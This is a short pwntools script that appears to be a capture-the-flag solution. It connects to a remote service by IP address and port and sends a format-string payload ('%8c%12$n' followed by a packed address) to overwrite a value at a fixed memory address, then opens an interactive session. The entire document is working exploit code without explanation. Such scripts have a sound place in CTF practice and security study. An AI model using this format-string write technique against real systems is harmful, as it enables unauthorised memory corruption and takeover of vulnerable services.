from pwn import *
p = remote("111.198.29.45", "53213")
context.log_level = 'debug'
target = 0x0804A068
payload = '%8c%12$n' + p32(target)
p.sendline(p32(target))
p.recv()
p.sendline(payload)
p.recv()
p.interactive()